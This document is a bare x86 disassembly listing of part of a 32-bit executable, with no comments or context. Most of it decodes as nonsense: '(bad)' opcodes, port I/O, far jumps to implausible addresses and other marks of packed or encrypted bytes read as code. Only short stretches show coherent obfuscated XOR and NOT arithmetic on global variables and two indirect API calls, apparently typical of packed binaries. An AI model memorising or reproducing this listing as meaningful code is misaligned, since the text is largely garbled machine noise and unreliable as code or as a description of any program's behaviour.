  40362b:	xor    eax,DWORD PTR [ebp+0x29027595]
  403631:	aad    0x73
  403633:	rcr    DWORD PTR [eax-0x60],cl
  403636:	mov    cl,cl
  403638:	mov    eax,ds:0xed477fdf
  40363d:	sub    DWORD PTR [ecx],edi
  40363f:	jne    0x40362a
  403641:	cmp    ebx,DWORD PTR [ebx]
  403643:	xchg   edi,eax
  403644:	je     0x403686
  403646:	mov    eax,ds:0x27db102d
  40364b:	xchg   esp,eax
  40364c:	xlat   BYTE PTR ds:[ebx]
  40364d:	cmp    eax,0x5ce18957
  403652:	repnz stc 
  403654:	retf   0x919e
  403657:	int    0xce
  403659:	pushf  
  40365a:	(bad)  
  40365b:	dec    ecx
  40365c:	add    BYTE PTR [esi],bh
  40365e:	xor    DWORD PTR [ebx-0x3b39d448],edi
  403664:	daa    
  403665:	mov    BYTE PTR [esi-0x19],ah
  403668:	and    eax,edx
  40366a:	mov    edi,0xb3a161d2
  40366f:	enter  0xc2fa,0x37
  403673:	pop    edi
  403674:	pop    edx
  403675:	xchg   edx,eax
  403676:	sbb    eax,DWORD PTR [eax+0x352dd11a]
  40367c:	imul   edi,DWORD PTR [eax-0x71],0xffffff95
  403680:	adc    BYTE PTR [esi-0x4b],al
  403683:	push   ss
  403684:	sub    eax,DWORD PTR [ecx+0xa555962]
  40368a:	in     eax,dx
  40368b:	xor    bh,dl
  40368d:	rcr    BYTE PTR [edx],1
  40368f:	sbb    DWORD PTR [ebx+0x6a],ebx
  403692:	dec    eax
  403693:	mov    ds,esi
  403695:	fld    TBYTE PTR [ebx-0x6cd7537c]
  40369b:	xor    eax,0xf6f2cd05
  4036a0:	mov    ds:0x8168d539,al
  4036a5:	pop    esp
  4036a6:	inc    esp
  4036a7:	push   ecx
  4036a8:	add    al,0xcb
  4036aa:	ror    BYTE PTR [edx],cl
  4036ac:	jno    0x4036b4
  4036ae:	mov    edi,DWORD PTR [ebx]
  4036b0:	mov    ecx,0x2b4b462b
  4036b5:	sbb    ecx,DWORD PTR cs:[ecx]
  4036b8:	add    ebx,DWORD PTR [esi+ecx*2+0x25bcbde6]
  4036bf:	or     dl,BYTE PTR [edx+ecx*4]
  4036c2:	js     0x40368b
  4036c4:	fisub  DWORD PTR [edx-0x44026b3b]
  4036ca:	(bad)  
  4036cb:	ds pop ecx
  4036cd:	(bad)  
  4036ce:	in     al,dx
  4036cf:	call   0x5e8e9e61
  4036d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036d5:	pop    esi
  4036d6:	adc    ebx,DWORD PTR [ebx-0x39]
  4036d9:	stos   BYTE PTR es:[edi],al
  4036da:	cs pop ss
  4036dc:	aas    
  4036dd:	ret    0x7aa4
  4036e0:	aaa    
  4036e1:	loopne 0x40373b
  4036e3:	xlat   BYTE PTR ds:[ebx]
  4036e4:	mov    cl,0xfc
  4036e6:	mov    ds:0xf4635278,eax
  4036eb:	dec    edi
  4036ec:	jle    0x40371d
  4036ee:	dec    esi
  4036ef:	inc    edi
  4036f0:	xchg   DWORD PTR [eax],edi
  4036f2:	dec    ecx
  4036f3:	xor    ch,BYTE PTR [esi+0x2d35294e]
  4036f9:	dec    ebp
  4036fa:	std    
  4036fb:	out    0x17,eax
  4036fd:	xchg   esi,eax
  4036fe:	sub    al,BYTE PTR [edi]
  403700:	dec    ebp
  403701:	aaa    
  403702:	pop    es
  403703:	sub    BYTE PTR [esi+0x416990a2],0x8d
  40370a:	add    al,0xe7
  40370c:	xchg   esi,eax
  40370d:	aas    
  40370e:	call   DWORD PTR [eax+0x13]
  403711:	das    
  403712:	bound  ebx,QWORD PTR [esi-0x4f30d6a0]
  403718:	push   DWORD PTR [ecx]
  40371a:	jecxz  0x4036bc
  40371c:	stos   BYTE PTR es:[edi],al
  40371d:	pusha  
  40371e:	xchg   ebp,eax
  40371f:	sbb    DWORD PTR [ebx+0x65],ebx
  403722:	clc    
  403723:	jecxz  0x403728
  403725:	lds    esp,FWORD PTR [ecx]
  403727:	clc    
  403728:	icebp  
  403729:	lock es enter 0xc961,0xf1
  40372f:	fwait
  403730:	rcr    ecx,1
  403732:	mov    dh,0x13
  403734:	call   0xb4a5:0xef0df9aa
  40373b:	mov    ebx,0xd425232a
  403740:	(bad)  
  403741:	sub    esi,ecx
  403743:	mov    ah,0x3
  403745:	push   esi
  403746:	mov    es,WORD PTR [edx+0x6a2e2bf6]
  40374c:	or     bl,BYTE PTR [ecx-0x6b4aa7e2]
  403752:	xor    cl,BYTE PTR [ecx]
  403754:	mov    dl,0xe1
  403757:	stos   DWORD PTR es:[edi],eax
  403758:	mov    ds:0xdad33809,eax
  40375d:	shl    DWORD PTR [ebx+0x669fad84],cl
  403763:	dec    ecx
  403764:	rol    DWORD PTR [eax-0x3d],0xc2
  403768:	adc    ch,dl
  40376a:	adc    al,BYTE PTR [ebp+ebx*8+0x1]
  40376e:	sti    
  40376f:	sub    ch,BYTE PTR [ecx-0x64]
  403772:	xor    al,0xb2
  403774:	push   edi
  403775:	inc    ebx
  403776:	and    BYTE PTR [ebx-0x78a664c5],bl
  40377c:	mov    ebx,0x426a61c6
  403781:	mov    ecx,0xafffb940
  403786:	dec    eax
  403787:	and    ecx,DWORD PTR [edi-0x42]
  40378a:	inc    ebx
  40378b:	and    eax,0xf5d2d27b
  403790:	or     esi,DWORD PTR [ecx+ebx*2-0x521dee98]
  403797:	clc    
  403798:	push   0x48
  40379a:	or     eax,0xd3015352
  40379f:	sar    BYTE PTR [edi+ecx*1-0x18],cl
  4037a3:	(bad)  
  4037a5:	mov    ds:0xe58787cf,eax
  4037aa:	(bad)  
  4037ab:	ins    DWORD PTR es:[edi],dx
  4037ac:	xor    al,0xcd
  4037ae:	adc    BYTE PTR [esi-0x201925cd],cl
  4037b4:	pop    es
  4037b5:	icebp  
  4037b6:	mov    dh,0x97
  4037b8:	icebp  
  4037b9:	addr16 dec esi
  4037bb:	sbb    esi,DWORD PTR [edi]
  4037bd:	test   dl,0x27
  4037c0:	mov    fs,WORD PTR [edx-0x5c1e1ceb]
  4037c6:	test   DWORD PTR [ebx+eiz*2],0x6937a7f1
  4037cd:	(bad)  
  4037cf:	jno    0x403754
  4037d1:	sar    DWORD PTR [edi+0x69],cl
  4037d4:	jmp    0x9adf:0x31474179
  4037db:	jo     0x4037a2
  4037dd:	or     BYTE PTR [ecx+edi*4-0x7e],dh
  4037e1:	pop    ecx
  4037e2:	push   edi
  4037e3:	or     esp,DWORD PTR [edi+0x2ef9f34f]
  4037e9:	xor    BYTE PTR [edx],bl
  4037eb:	inc    edi
  4037ec:	je     0x403774
  4037ee:	xchg   BYTE PTR [esi+0x4b],ch
  4037f1:	jo     0x4037da
  4037f3:	aam    0x17
  4037f5:	push   0x25
  4037f7:	imul   BYTE PTR [edx-0x42c35546]
  4037fd:	nop
  4037fe:	lahf   
  4037ff:	push   ss
  403800:	dec    eax
  403801:	std    
  403802:	push   eax
  403803:	jp     0x4037f9
  403805:	cmp    al,0x47
  403807:	mov    edx,0xcb8c8114
  40380c:	imul   ebp,DWORD PTR [eax-0x76f9dfe5],0xffffffe3
  403813:	ficom  WORD PTR [ebx]
  403815:	fiadd  WORD PTR [eax]
  403817:	ffree  st(6)
  403819:	add    bh,BYTE PTR [edx-0x4e77cf41]
  40381f:	mov    esi,0xd607ac4f
  403824:	mov    esi,0x5aa8ad54
  403829:	cmc    
  40382a:	mov    al,0xc5
  40382c:	adc    BYTE PTR [edx+0x74],al
  40382f:	xchg   ecx,eax
  403830:	push   eax
  403831:	pop    edi
  403832:	mov    DWORD PTR [ebx+0x42df10ac],esi
  403838:	and    ebp,DWORD PTR [ecx]
  40383a:	pop    eax
  40383b:	mov    bl,0xc4
  40383d:	cli    
  40383e:	xor    al,0x2a
  403840:	out    0x38,eax
  403842:	mov    cl,0x96
  403844:	mov    al,0x58
  403846:	inc    ebp
  403847:	and    BYTE PTR [edi+esi*4+0x7fcb2b5c],bl
  40384e:	pop    ebp
  40384f:	sbb    ecx,DWORD PTR [edi+ebp*8]
  403852:	aam    0xee
  403854:	lods   al,BYTE PTR ds:[esi]
  403855:	add    ecx,ebp
  403857:	retf   
  403858:	sahf   
  403859:	jmp    0x32c3:0x7de8060f
  403860:	lods   al,BYTE PTR ds:[esi]
  403861:	sub    eax,0x72555824
  403866:	sbb    ebx,ecx
  403868:	jp     0x403823
  40386a:	fstp   DWORD PTR [eax]
  40386c:	mov    edx,DWORD PTR [ecx]
  40386e:	or     ebx,DWORD PTR [esi+0x76]
  403871:	iret   
  403872:	sub    eax,0x31862ed8
  403877:	and    esi,ecx
  403879:	pop    es
  40387a:	mov    bl,0xba
  40387c:	int    0xd1
  40387e:	cmp    eax,0xb40473b3
  403883:	inc    edi
  403884:	ss cld 
  403886:	call   0xf6f3:0x4b621054
  40388d:	dec    cl
  40388f:	jns    0x4038fb
  403891:	xchg   ebp,eax
  403892:	jmp    DWORD PTR [edi]
  403894:	mov    dl,0xc6
  403896:	stc    
  403897:	add    BYTE PTR [esi+esi*4],dh
  40389a:	in     eax,dx
  40389b:	sti    
  40389c:	or     bl,BYTE PTR [eax+edx*1-0x5ece9e76]
  4038a3:	or     cl,bh
  4038a5:	std    
  4038a6:	push   ds
  4038a7:	idiv   DWORD PTR ds:0x8034f006
  4038ad:	adc    DWORD PTR [esi+0x63],esp
  4038b0:	sub    eax,0xdc63ac80
  4038b5:	cmp    DWORD PTR [ecx+0x6c],ebp
  4038b8:	push   edx
  4038b9:	imul   BYTE PTR ds:0xd17c8c8c
  4038bf:	mov    dl,0x5c
  4038c1:	jge    0x403928
  4038c3:	stos   BYTE PTR es:[edi],al
  4038c4:	push   ss
  4038c5:	jbe    0x4038d8
  4038c7:	push   ds
  4038c8:	adc    ebp,ebp
  4038ca:	jmp    0x40392d
  4038cc:	push   ebx
  4038cd:	xchg   ecx,eax
  4038ce:	mov    al,0x9d
  4038d0:	xor    cl,ch
  4038d2:	pop    edx
  4038d3:	xchg   edi,eax
  4038d4:	test   ebp,edx
  4038d6:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4038d8:	adc    ebx,esp
  4038da:	cwde   
  4038db:	cwde   
  4038dc:	or     esp,DWORD PTR [ecx-0x66]
  4038df:	cmp    ch,0x1d
  4038e2:	sar    BYTE PTR [esi+esi*8+0x2d1ac0f],1
  4038e9:	xor    DWORD PTR ds:0x4284c5,0x428575
  4038f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4038f6:	mov    ecx,DWORD PTR [ebp+0x18]
  4038f9:	xor    DWORD PTR ds:0x428459,0x428581
  403903:	xor    DWORD PTR [ebp-0x1c],edi
  403906:	adc    DWORD PTR ds:0x428445,0x4aad
  403910:	shl    ecx,0x1e
  403913:	not    DWORD PTR ds:0x42840d
  403919:	xor    ecx,ecx
  40391b:	sub    DWORD PTR ds:0x428559,0x450d
  403925:	or     ecx,DWORD PTR [ebp-0x1c]
  403928:	jmp    0x403cc9
  40392d:	cdq    
  40392e:	jbe    0x40398b
  403930:	fidivr WORD PTR [ebx+eiz*8-0x40084545]
  403937:	mul    BYTE PTR [esi+eiz*4-0x426d8994]
  40393e:	in     eax,dx
  40393f:	mov    esi,0xbec4bdbe
  403944:	mov    esi,0xdaa73eb7
  403949:	xchg   DWORD PTR [edi+0x5b68f5b4],esi
  40394f:	jg     0x403991
  403951:	xor    al,0xdd
  403953:	inc    ecx
  403954:	fadd   DWORD PTR [edi+0x6]
  403957:	test   eax,0x118c67d7
  40395c:	add    al,0x99
  40395e:	dec    edx
  40395f:	mov    es,WORD PTR [eax-0x545a12e3]
  403965:	sub    eax,0x34e074cd
  40396a:	push   0xffffffab
  40396c:	sbb    esi,DWORD PTR [ebx-0x55]
  40396f:	in     al,dx
  403970:	out    dx,eax
  403971:	push   edx
  403972:	jle    0x4039ac
  403974:	leave  
  403975:	push   edi
  403976:	jecxz  0x40396b
  403978:	sbb    al,0xdd
  40397a:	ss mov esi,0x467d0338
  403980:	xchg   ebp,eax
  403981:	xor    cl,BYTE PTR [edi+edx*8-0x6e]
  403985:	in     eax,0x73
  403987:	mov    DWORD PTR [esi+0x1c6cdfd5],0xeca3a508
  403991:	das    
  403992:	sub    dh,BYTE PTR [ebp-0x74]
  403995:	cmc    
  403996:	(bad)  
  403997:	leave  
  403998:	pop    ebp
  403999:	or     eax,0xfb042009
  40399e:	(bad)  
  4039a0:	cmp    bh,BYTE PTR [edx]
  4039a2:	pop    ss
  4039a3:	pop    eax
  4039a4:	ds adc ch,BYTE PTR es:[eax]
  4039a8:	adc    edx,DWORD PTR ds:0xfc2d8470
  4039ae:	pop    esi
  4039af:	icebp  
  4039b0:	push   0xffffffa3
  4039b2:	gs into 
  4039b4:	repz xchg esp,eax
  4039b6:	cli    
  4039b7:	(bad)  
  4039b8:	fnsave [edx+0xe]
  4039bb:	jb     0x4039f6
  4039bd:	fld    TBYTE PTR [ebx-0x2c957b7b]
  4039c3:	cmp    al,BYTE PTR [ecx+0x5c767236]
  4039c9:	mov    cl,BYTE PTR [ebx]
  4039cb:	push   ebp
  4039cc:	or     al,0x5a
  4039ce:	mov    ebx,edx
  4039d0:	mov    ebx,0x6d77a217
  4039d5:	fsubp  st(6),st
  4039d7:	shl    BYTE PTR [edx+0x3fc32d78],0x2e
  4039de:	xchg   ebp,eax
  4039df:	in     eax,0x2d
  4039e1:	(bad)  
  4039e2:	call   0xee54c984
  4039e7:	mov    edi,0x84497cc2
  4039ec:	repnz iret 
  4039ee:	call   0x7828:0x67718a0a
  4039f5:	sub    al,0xfa
  4039f7:	imul   esi,DWORD PTR [ebx-0x6d1589b4],0x6
  4039fe:	int3   
  4039ff:	or     al,0x2
  403a01:	outs   dx,DWORD PTR ds:[esi]
  403a02:	xchg   esi,eax
  403a03:	mov    al,ds:0x769d21d3
  403a08:	mov    edx,0x7173c8f6
  403a0d:	(bad)  
  403a0e:	in     al,dx
  403a0f:	ds cld 
  403a11:	and    al,0x8f
  403a13:	mov    ds:0xb0a62e76,al
  403a18:	in     eax,dx
  403a19:	loop   0x403a77
  403a1b:	dec    ecx
  403a1c:	adc    BYTE PTR [edx+0x65],ah
  403a1f:	test   eax,0xe0b939e2
  403a24:	dec    ebp
  403a25:	push   eax
  403a26:	fwait
  403a27:	retf   
  403a28:	mov    dh,0xc6
  403a2a:	cmp    edx,DWORD PTR [ebx]
  403a2c:	xor    BYTE PTR [ebx+eax*8+0x3f64bbf0],bh
  403a33:	shl    BYTE PTR [esi+0x6d4d811],1
  403a39:	sbb    eax,0x62bee74b
  403a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a3f:	(bad)  
  403a40:	cmp    bl,BYTE PTR [ecx-0x54]
  403a43:	sub    BYTE PTR [eax+0x1],0x3d
  403a47:	push   esp
  403a48:	and    bh,0xfa
  403a4b:	loopne 0x403ab5
  403a4d:	adc    BYTE PTR [ebx],ch
  403a4f:	fstp   QWORD PTR [edi-0x664d9c9a]
  403a55:	adc    eax,0x362d0558
  403a5a:	stos   DWORD PTR es:[edi],eax
  403a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a5c:	pusha  
  403a5d:	cmc    
  403a5e:	cwde   
  403a5f:	cmp    BYTE PTR [edx+0x7d5bd69a],0x4
  403a66:	jne    0x4039ec
  403a68:	cmc    
  403a69:	je     0x403a03
  403a6b:	xchg   ecx,edi
  403a6d:	(bad)  
  403a6e:	adc    cl,dl
  403a70:	pop    esp
  403a71:	(bad)  
  403a72:	jecxz  0x403a44
  403a74:	and    BYTE PTR [edx-0x39],bl
  403a77:	mov    ss,WORD PTR [eax-0x23b864a]
  403a7d:	dec    BYTE PTR [ecx]
  403a7f:	adc    DWORD PTR [ebp+0xa],eax
  403a82:	addr16 in al,dx
  403a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a85:	cmp    al,0xe1
  403a87:	bound  esp,QWORD PTR [esi]
  403a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a8a:	xor    BYTE PTR [eax],ah
  403a8c:	aas    
  403a8d:	push   ebp
  403a8e:	and    dl,dh
  403a90:	(bad)  
  403a91:	out    dx,eax
  403a92:	jae    0x403a66
  403a94:	push   esi
  403a95:	fist   DWORD PTR [ecx+0x38]
  403a98:	mov    BYTE PTR [esi],ch
  403a9a:	rcl    BYTE PTR [ecx],1
  403a9c:	xor    eax,0xb16f0d82
  403aa1:	add    DWORD PTR [edi],ebx
  403aa3:	inc    ecx
  403aa4:	xlat   BYTE PTR ds:[ebx]
  403aa5:	arpl   bp,si
  403aa7:	ret    0x4939
  403aaa:	call   0x8d7c2f2d
  403aaf:	test   eax,0xfa9428e4
  403ab4:	inc    edi
  403ab5:	jo     0x403ad2
  403ab7:	cli    
  403ab8:	inc    eax
  403ab9:	mov    bl,0x6d
  403abb:	push   cs
  403abc:	mov    ds:0xec74fb24,eax
  403ac1:	xchg   eax,edi
  403ac3:	xor    al,0x21
  403ac5:	loop   0x403a9d
  403ac7:	inc    edx
  403ac8:	and    ch,BYTE PTR [esi+ebx*2+0x3a4865fa]
  403acf:	push   cs
  403ad0:	cmp    ebx,DWORD PTR [edx-0x57727695]
  403ad6:	lock cmp edi,edi
  403ad9:	inc    ebp
  403ada:	xor    eax,0x5a3293a5
  403adf:	push   esi
  403ae0:	and    bh,bh
  403ae2:	cmp    al,0x37
  403ae4:	adc    al,0xc3
  403ae6:	outs   dx,DWORD PTR ds:[esi]
  403ae7:	jmp    0x403a7d
  403ae9:	lahf   
  403aea:	iret   
  403aeb:	fild   WORD PTR [eax+0xa]
  403aee:	or     ch,BYTE PTR [ebx]
  403af0:	(bad)  
  403af2:	dec    edi
  403af3:	xchg   edx,eax
  403af4:	sub    al,0xbd
  403af6:	fst    QWORD PTR [edi+0x76]
  403af9:	and    DWORD PTR [ecx+0x5ac722b9],ecx
  403aff:	out    dx,al
  403b00:	ins    DWORD PTR es:[edi],dx
  403b01:	stos   BYTE PTR es:[edi],al
  403b02:	cli    
  403b03:	fidivr WORD PTR [esi+edi*4-0x1]
  403b07:	mov    ecx,0x9864afa5
  403b0c:	out    dx,eax
  403b0d:	out    0xfc,al
  403b0f:	mov    ch,0x75
  403b11:	mov    dh,0xef
  403b13:	lods   al,BYTE PTR ds:[esi]
  403b14:	pop    esi
  403b15:	jno    0x403a99
  403b17:	push   esi
  403b18:	(bad)  [esi+esi*1-0x1b]
  403b1c:	loopne 0x403add
  403b1e:	push   ds
  403b1f:	fistp  QWORD PTR [edi]
  403b21:	aad    0xf9
  403b23:	sbb    eax,0x90a2a982
  403b28:	jmp    0x3ab84e85
  403b2d:	jne    0x403b71
  403b2f:	test   BYTE PTR [edi-0x76700ff9],dl
  403b35:	and    dl,BYTE PTR ds:0xb57cb3b6
  403b3b:	fwait
  403b3c:	and    ecx,DWORD PTR [eax]
  403b3e:	and    al,0x21
  403b40:	jecxz  0x403bb1
  403b42:	pop    ebp
  403b43:	rcl    BYTE PTR [edi+0xea0fe9d],cl
  403b49:	inc    ebx
  403b4a:	adc    eax,0xc1dcdf3f
  403b4f:	jle    0x403ad9
  403b51:	xchg   cl,ah
  403b53:	dec    esi
  403b54:	imul   ecx,DWORD PTR [esi],0x16
  403b57:	dec    ebx
  403b58:	sbb    BYTE PTR [ecx-0x37fbb421],bl
  403b5e:	or     esp,ebp
  403b60:	sub    BYTE PTR [ebx],0x66
  403b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b64:	mov    ds:0xd402517e,al
  403b69:	mov    DWORD PTR [ecx-0x700adcc4],ebp
  403b6f:	dec    ecx
  403b70:	mov    dl,0xf5
  403b72:	push   0xb8bfef06
  403b77:	add    ch,BYTE PTR [edi]
  403b79:	mov    ch,BYTE PTR [edi+edx*2]
  403b7c:	add    eax,0x863a9aea
  403b81:	push   eax
  403b82:	cld    
  403b83:	pop    edx
  403b84:	out    dx,al
  403b85:	jecxz  0x403b8b
  403b87:	inc    esp
  403b88:	mov    edi,0xb84d5541
  403b8d:	push   ecx
  403b8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b8f:	outs   dx,DWORD PTR ds:[esi]
  403b90:	cdq    
  403b91:	fbstp  TBYTE PTR [eax]
  403b93:	jno    0x403b47
  403b95:	pop    DWORD PTR [edx+0x7e8931f3]
  403b9b:	loopne 0x403b8d
  403b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b9e:	mov    cl,0x52
  403ba0:	push   edx
  403ba1:	add    bh,0xdd
  403ba4:	jg     0x403be0
  403ba6:	ret    
  403ba7:	mov    al,0x17
  403ba9:	ds dec ecx
  403bab:	lea    ecx,[eax]
  403bad:	nop
  403bae:	outs   dx,BYTE PTR ds:[esi]
  403baf:	adc    esp,ebx
  403bb1:	lock sbb eax,0x8d2c9aa8
  403bb7:	aad    0x2f
  403bb9:	xchg   ebp,eax
  403bba:	int    0xc4
  403bbc:	cmp    DWORD PTR [ebx],edi
  403bbe:	inc    esi
  403bbf:	jbe    0x403bf7
  403bc1:	int3   
  403bc2:	ror    DWORD PTR [ebx-0x4aada502],1
  403bc8:	rcl    BYTE PTR [ecx],0xc0
  403bcb:	add    ebp,eax
  403bcd:	in     al,dx
  403bce:	jnp    0x403b58
  403bd0:	xchg   edx,eax
  403bd1:	mov    eax,0xa7f9465f
  403bd6:	(bad)  
  403bd8:	inc    eax
  403bd9:	ret    0xf7c1
  403bdc:	test   eax,0x82058974
  403be1:	xchg   edi,eax
  403be2:	mov    ebp,0x75a62047
  403be7:	mov    esp,0x3adfde8d
  403bec:	xor    DWORD PTR [eax],0xffffffdc
  403bef:	fmul   DWORD PTR [esi]
  403bf1:	push   esp
  403bf2:	test   bl,al
  403bf4:	mov    dl,0x2a
  403bf6:	push   0xa1f648d4
  403bfb:	jo     0x403c46
  403bfd:	lds    esi,FWORD PTR [edi]
  403bff:	nop
  403c00:	sar    DWORD PTR cs:[ebx],0x7f
  403c04:	mov    dh,0x73
  403c06:	arpl   cx,dx
  403c08:	xlat   BYTE PTR ds:[ebx]
  403c09:	out    0xda,eax
  403c0b:	sub    BYTE PTR [eax+0x65],0x6
  403c0f:	daa    
  403c10:	aas    
  403c11:	cmp    eax,0xa792f4b4
  403c16:	jmp    0x403c19
  403c18:	xlat   BYTE PTR ds:[ebx]
  403c19:	xor    esi,DWORD PTR [edi+0x27]
  403c1c:	pop    esp
  403c1d:	in     eax,0x21
  403c1f:	mov    cs,WORD PTR [ebp-0x5f5df63]
  403c25:	stc    
  403c26:	mov    esi,0x4f43f76
  403c2b:	pop    edx
  403c2c:	lock test al,0xa
  403c2f:	test   eax,0xd38d3fdb
  403c34:	icebp  
  403c35:	sub    ecx,DWORD PTR [ebp-0x77]
  403c38:	mov    ch,0xfa
  403c3a:	push   esp
  403c3b:	push   ds
  403c3c:	shl    DWORD PTR [ebp-0x8],1
  403c3f:	out    dx,al
  403c40:	ins    DWORD PTR es:[edi],dx
  403c41:	adc    DWORD PTR [edx],eax
  403c43:	ins    DWORD PTR es:[edi],dx
  403c44:	retf   
  403c45:	mov    al,ds:0x8bf0619d
  403c4a:	xchg   esp,eax
  403c4b:	js     0x403cbb
  403c4d:	cmc    
  403c4e:	pop    edi
  403c4f:	or     edx,DWORD PTR [esi+esi*1]
  403c52:	fcom   DWORD PTR [edi+0x629b9f37]
  403c58:	xor    BYTE PTR [ebx+0x60f92f4b],ah
  403c5e:	leave  
  403c5f:	inc    edx
  403c60:	add    al,0x63
  403c62:	sbb    cl,BYTE PTR [edi+edx*8-0x9]
  403c66:	adc    eax,DWORD PTR [ebp+0x4f54fbf4]
  403c6c:	rcl    DWORD PTR [edx-0x30],0x9
  403c70:	jge    0x403cd3
  403c72:	and    DWORD PTR [ecx-0x1639f4cc],ebp
  403c78:	fs ins DWORD PTR es:[edi],dx
  403c7a:	cmp    bl,BYTE PTR [ebp-0x1a]
  403c7d:	aas    
  403c7e:	(bad)  
  403c7f:	enter  0x4d06,0x1e
  403c83:	fs ins BYTE PTR es:[edi],dx
  403c85:	(bad)  
  403c87:	inc    ebp
  403c88:	mov    esi,0x7d4ea310
  403c8d:	push   ebp
  403c8e:	inc    esp
  403c8f:	pop    es
  403c90:	push   0xfffffffe
  403c92:	mov    ah,0x62
  403c94:	mov    ah,BYTE PTR [ebp-0x19]
  403c97:	mov    eax,ds:0x6a6e6e83
  403c9c:	add    esi,DWORD PTR [edx+0x51]
  403c9f:	xor    BYTE PTR [ecx-0xa2d2c25],ah
  403ca5:	retf   
  403ca6:	adc    edx,edi
  403ca8:	mov    ebx,0xe3056661
  403cad:	or     eax,eax
  403caf:	xchg   dh,dl
  403cb1:	sahf   
  403cb2:	and    BYTE PTR [eax+esi*8],al
  403cb5:	adc    ebp,edx
  403cb7:	jb     0x403cc1
  403cb9:	cmp    ch,cl
  403cbb:	(bad)  
  403cbc:	ror    BYTE PTR [edi+0x45],0x19
  403cc0:	ret    0xf635
  403cc3:	and    cl,BYTE PTR [ebx]
  403cc5:	or     dh,BYTE PTR [ecx*8+0x2eac179]
  403ccc:	movzx  edx,WORD PTR ds:0x428411
  403cd3:	and    DWORD PTR ds:0x42840d,edx
  403cd9:	mov    edx,DWORD PTR [ebp+0x1c]
  403cdc:	cmp    DWORD PTR ds:0x428475,0x0
  403ce3:	mov    edx,0xb30
  403ce8:	not    DWORD PTR ds:0x42833d
  403cee:	jmp    0x403db9
  403cf3:	mov    DWORD PTR ds:0x428341,0x7955
  403cfd:	mov    DWORD PTR ds:0x4284cd,0x3fbe
  403d07:	cmp    DWORD PTR ds:0x428475,0x0
  403d0e:	jae    0x403d49
  403d14:	push   0x2165
  403d19:	push   0x209b
  403d1e:	push   0x61ab
  403d23:	push   0x585a
  403d28:	push   DWORD PTR [ebp-0x14]
  403d2b:	call   DWORD PTR ds:0x42e0c0
  403d31:	xor    DWORD PTR ds:0x42840d,edi
  403d37:	xor    DWORD PTR ds:0x428419,edi
  403d3d:	xor    edx,DWORD PTR ds:0x428479
  403d43:	sub    DWORD PTR ds:0x428365,edi
  403d49:	sbb    DWORD PTR ds:0x428481,0x3090
  403d53:	sub    DWORD PTR ds:0x428431,ecx
  403d59:	xor    DWORD PTR ds:0x4284dd,edi
  403d5f:	cmp    DWORD PTR ds:0x42854d,0x0
  403d66:	mov    edx,0x71bd
  403d6b:	not    edx
  403d6d:	jmp    0x403db9
  403d72:	mov    edx,0x37a5
  403d77:	mov    edx,0x5337
  403d7c:	cmp    DWORD PTR ds:0x42854d,0x0
  403d83:	jle    0x403dad
  403d89:	push   0x428445
  403d8e:	call   DWORD PTR ds:0x42e0c4
  403d94:	mov    edx,DWORD PTR ds:0x428521
  403d9a:	mov    edx,DWORD PTR [edx]
  403d9c:	and    DWORD PTR ds:0x42832d,edx
  403da2:	adc    DWORD PTR ds:0x428429,0x11e9
  403dac:	dec    edx
  403dad:	and    edx,0xf08
  403db3:	sub    edx,DWORD PTR ds:0x428571
  403db9:	mov    DWORD PTR [ebp-0x2c],ecx
  403dbc:	mov    ecx,DWORD PTR [esi]
  403dbe:	add    DWORD PTR ds:0x428445,ebx
  403dc4:	mov    edx,DWORD PTR [esi+0x4]
  403dc7:	or     DWORD PTR ds:0x428335,0x428349
  403dd1:	shrd   ecx,edx,0x2
  403dd5:	xor    DWORD PTR ds:0x4284d9,0x24cb
  403ddf:	shr    edx,0x2
  403de2:	and    edx,DWORD PTR ds:0x428561
  403de8:	mov    DWORD PTR [ebp-0x1c],ecx
  403deb:	mov    ecx,DWORD PTR [esi]
  403ded:	mov    edx,DWORD PTR [esi+0x4]
  403df0:	xor    DWORD PTR [ebp-0x1c],edi
  403df3:	xor    edx,edx
  403df5:	or     edx,DWORD PTR [ebp-0x1c]
  403df8:	sub    DWORD PTR ds:0x42840d,0x5e3f
  403e02:	shl    ecx,0x1e
  403e05:	sbb    DWORD PTR ds:0x42840d,0x5068
  403e0f:	add    edx,DWORD PTR [ebp-0x2c]
  403e12:	jmp    0x4041b3
  403e17:	bound  ecx,QWORD PTR [ebx-0x73d3f5ff]
  403e1d:	push   0xffffffab
  403e1f:	(bad)  
  403e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e21:	push   ss
  403e22:	ror    ebx,1
  403e24:	lods   eax,DWORD PTR ds:[esi]
  403e25:	(bad)  
  403e26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e27:	mov    esi,0xbdbebef5
  403e2c:	les    edi,FWORD PTR [esi-0x1b48df42]
  403e32:	xchg   ebx,eax
  403e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e34:	fnstsw WORD PTR [ecx]
  403e36:	xchg   edi,eax
  403e37:	or     dl,ah
  403e39:	(bad)  
  403e3a:	out    0x38,al
  403e3c:	add    al,0x99
  403e3e:	inc    edi
  403e3f:	into   
  403e40:	mov    esp,0x8ee62c62
  403e45:	lock call 0xed08:0x96114526
  403e4d:	fmul   DWORD PTR [edi-0x58]
  403e50:	push   0x55d2d19a
  403e55:	test   BYTE PTR [esp+edi*1-0x54],bl
  403e59:	cmp    eax,0x93f36beb
  403e5e:	lock enter 0xd840,0x22
  403e63:	mov    edx,0x8f013aef
  403e68:	sub    al,0x53
  403e6a:	addr16 (bad) 
  403e6c:	xchg   edx,eax
  403e6d:	push   0xa
  403e6f:	or     DWORD PTR [ebp-0x2b5de6ba],esp
  403e75:	jmp    DWORD PTR [edx-0x35]
  403e78:	push   cs
  403e79:	fadd   DWORD PTR [edx+0x46e6d0f7]
  403e7f:	ja     0x403ebd
  403e81:	aad    0xe4
  403e83:	push   esp
  403e84:	push   ebp
  403e85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e86:	jg     0x403e6e
